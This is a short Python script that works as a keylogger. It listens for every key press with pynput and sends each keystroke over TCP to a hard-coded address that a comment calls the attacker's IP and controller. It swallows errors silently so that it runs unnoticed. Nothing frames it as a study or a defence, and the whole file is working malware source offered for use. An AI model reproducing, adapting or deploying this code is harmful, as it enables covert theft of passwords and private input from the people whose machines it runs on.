import os
import socket
import threading
from pynput import keyboard

SERVER_IP = "192.168.1.100"  # Replace with attacker's IP
SERVER_PORT = 5000          # Port to connect to the controller

logging_active = True

def send_data(data):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((SERVER_IP, SERVER_PORT))
            s.sendall(data.encode('utf-8'))
    except:
        pass

def on_press(key):
    global logging_active
    if logging_active:
        try:
            send_data(str(key.char))
        except AttributeError:
            send_data(str(key))

def start_logging():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    t = threading.Thread(target=start_logging)
    t.start()
